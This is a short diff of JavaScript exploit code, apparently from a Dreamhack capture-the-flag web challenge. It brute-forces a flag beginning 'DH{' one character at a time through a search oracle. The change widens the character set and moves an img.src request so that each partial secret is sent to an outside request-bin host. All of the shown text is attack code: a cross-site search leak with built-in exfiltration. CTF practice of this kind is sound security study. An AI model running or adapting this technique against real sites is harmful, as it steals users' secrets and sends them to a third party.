@@ -26,18 +26,18 @@
     }
 
     async function exploit() {
-        let chars = "0123456789abcdef}"
+        let chars = "0123456789abcdefghijklmnopqrstuvwxyz"
         let secret = "DH{";
 
         while (secret.length <= 32) {
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
+                    img.src = `https://ffkjeon.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
         }
-        img.src = `https://qcvglag.request.dreamhack.games/${secret}`;
     }
 
     exploit();
